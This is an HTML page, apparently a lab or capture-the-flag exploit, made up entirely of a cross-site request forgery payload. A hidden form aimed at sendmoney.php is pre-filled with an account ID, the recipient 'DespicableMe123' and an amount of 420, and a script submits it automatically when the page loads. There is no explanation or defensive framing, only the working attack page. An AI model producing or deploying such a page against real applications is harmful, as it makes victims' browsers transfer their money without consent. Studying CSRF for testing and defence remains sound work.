<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Title</title>
</head>
<body>
    <h1>Cash transfer app</h1>
    <form action="sendmoney.php" method="POST" style="display:none;">
        <select name="chosen-account" id="chosen-account">
            <option value="1f3a6142-6a3d-482b-a5ea-198d70b3e32b"></option>
            ?>
        </select>
        <input type="hidden" id="recipient-username" name="recipient-username" placeholder="insert the recipient's" value="DespicableMe123">
        <label for="amount">Amount</label>
        <input type="number" id="amount" name="amount" min="1" step="0.01" placeholder="Enter amount" value="420">
    </form>
</body>
<script>
    document.forms[0].submit();
</script>
</html>